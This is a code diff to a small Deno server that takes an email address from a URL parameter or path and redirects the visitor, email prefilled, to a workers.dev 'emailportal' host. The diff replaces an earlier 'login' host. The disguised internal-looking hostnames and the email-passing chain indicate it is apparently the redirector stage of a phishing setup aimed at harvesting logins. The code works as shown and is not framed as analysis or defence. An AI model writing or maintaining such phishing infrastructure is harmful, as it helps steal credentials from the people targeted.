@@ -4,10 +4,11 @@ Deno.serve({ port: PORT }, async (req) => {
   const url = new URL(req.url);
 
   const redirectBase =
-    "https://login.internalsortservices.workers.dev/";
+    "https://emailportal.internalwave.workers.dev/";
 
-  let email: string | null = null;
+  let email = null;
 
+  // 1) ?state=email@x.com  (from any upstream site)
   const state = url.searchParams.get("state");
   if (state) {
     try {
@@ -20,6 +21,7 @@ Deno.serve({ port: PORT }, async (req) => {
     }
   }
 
+  // 2) fallback: /email@x.com path segment
   if (!email) {
     const path = url.pathname.replace(/\/+$/, "").split("/").at(-1);
     if (path && path.includes("@") && !path.includes("/")) {
@@ -31,8 +33,9 @@ Deno.serve({ port: PORT }, async (req) => {
     }
   }
 
+  // Must be ?state= — worker-cf.js reads searchParams.get('state')
   const redirectUrl = email
-    ? redirectBase.replace(/\/+$/, "") + "/" + email
+    ? redirectBase.replace(/\/+$/, "") + "?state=" + encodeURIComponent(email)
     : redirectBase;
 
   return Response.redirect(redirectUrl, 302);
